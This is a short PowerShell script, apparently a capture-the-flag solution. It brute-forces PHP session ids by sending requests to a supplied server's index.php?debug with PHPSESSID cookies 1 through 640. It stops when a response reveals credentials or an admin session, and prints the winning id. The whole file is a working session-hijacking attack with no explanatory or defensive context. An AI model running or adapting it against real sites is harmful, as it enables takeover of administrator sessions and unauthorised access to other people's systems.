param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

$url = "http://$server/index.php?debug"


$correctStr = 'The credentials'

for ($i = 1; $i -le 640; $i++) {
    write-host "Session: $i"
    $cookieContainer = New-Object System.Net.CookieContainer
    $cookie = New-Object System.Net.Cookie("PHPSESSID", $i, "/", $server)
    $cookieContainer.Add($cookie)
    
    $requestSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
    $requestSession.Cookies = $cookieContainer;

    $commandurl = $url;
    $response = Invoke-WebRequest -Headers $headers -URI $commandurl -WebSession $requestSession;
    
    if ($response.Content -like "*$correctStr*") {
        write-host $response.content `n
        write-host "[admin] => 1"
        write-host "yooooo: phpSESSID: $i"
        break
    }

}